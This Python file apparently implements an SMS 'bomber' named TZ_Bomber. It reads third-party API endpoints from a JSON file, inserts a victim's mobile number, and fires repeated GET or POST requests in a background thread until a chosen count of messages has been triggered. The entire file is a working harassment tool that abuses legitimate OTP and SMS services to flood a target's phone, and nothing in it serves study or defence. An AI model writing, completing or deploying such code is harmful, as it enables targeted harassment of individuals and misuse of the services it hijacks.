from json import dumps, loads
from requests import get, post
from random import choices
from tldextract import extract
from string import ascii_letters
from threading import Thread

def get_random(length=10):
    return "".join(choices(ascii_letters, k=length))

def get_domain(url):
    return ".".join(list(extract(url)))

def send_request(info:dict):
    url=info["url"]
    method=info["method"]
    data=info["data"]
    headers=info["headers"]
    identifier=info["identifier"]
    preback=info.get("preback")
    if method.lower()=="get":
        engine=get
    elif method.lower()=="post":
        engine=post
    else:
        print("Method Error:", get_domain(url))
        engine=post
    try:
        resp=engine(url, data=data, headers=headers)
    except KeyboardInterrupt:
        exit()
    except: return False
    if identifier in resp.text:
        return True
    else:
        if preback:
            url=preback["url"]
            method=preback["method"]
            data=preback["data"]
            headers=preback["headers"]
            identifier=preback["identifier"]
            if method.lower()=="get":
                engine=get
            elif method.lower()=="post":
                engine=post
            else:
                print("Method Error:", get_domain(url))
                engine=post
            try:
                resp=engine(url, data=data, headers=headers)
            except KeyboardInterrupt:
                exit()
            except:return False
            if identifier in resp.text:
                return True
            else:
                #print(identifier)
                #print(resp.text)
                return False
        else:
            #print(identifier)
            #print(resp.text)
            return False

def get_api(unlimited=False):
	all_api=loads(open("all_api.json").read())
	un_api=[]
	if unlimited:
		for api in all_api:
			if api["unlimited"]:
				un_api.append(api)
		return un_api
	return all_api

def prepare_api(api, mobile):
	api=dumps(api)
	api=api.replace("{MOBILE_NO}", mobile)
	api=api.replace("{RANDOM}", get_random())
	api=loads(api)
	return api

def calc_percent(minimum, maximum, current):
	return float("{:.1f}".format((((current - minimum) * 100) / (maximum - minimum))))

class TZ_Bomber:
	def __init__(self, mobile, amount, unlimited=False):
		self.mobile=str(mobile)
		self.amount=amount
		self.unlimited=unlimited
		self.i=0
		self.attempt=0
		self.sent=0
		self.failed=0
		self.run=False
		self.completed=False
		self.all_api=get_api(self.unlimited)

	@property
	def progress(self):
		return calc_percent(0, self.amount, self.sent)

	@property
	def remaining(self):
		return self.amount - self.sent
		
	def _bomb(self):
		while self.run:
			api=self.all_api[self.i]
			api=prepare_api(api, self.mobile)
			request=send_request(api)
			self.attempt+=1
			if request:
				self.sent+=1
			else:
				self.failed+=1
			try:
				self.i+=1
				self.all_api[self.i]
			except:
				self.i=0
			if self.amount<=self.sent:
				self.run=False
				self.completed=True
				
	def start(self):
		self.run=True
		t=Thread(target=self._bomb)
		t.setDaemon(True)
		t.start()
		
	def stop(self):
		self.run=False










		



